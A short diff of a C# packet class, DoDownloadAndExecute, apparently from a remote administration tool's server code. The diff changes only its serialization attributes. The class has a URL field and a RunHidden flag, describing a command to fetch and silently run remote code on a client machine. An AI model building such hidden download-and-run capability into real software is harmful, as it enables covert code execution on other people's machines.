@@ -1,15 +1,13 @@
-﻿using ProtoBuf;
+﻿using System;
 using xServer.Core.Networking;
 
 namespace xServer.Core.Packets.ServerPackets
 {
-    [ProtoContract]
+    [Serializable]
     public class DoDownloadAndExecute : IPacket
     {
-        [ProtoMember(1)]
         public string URL { get; set; }
 
-        [ProtoMember(2)]
         public bool RunHidden { get; set; }
 
         public DoDownloadAndExecute()
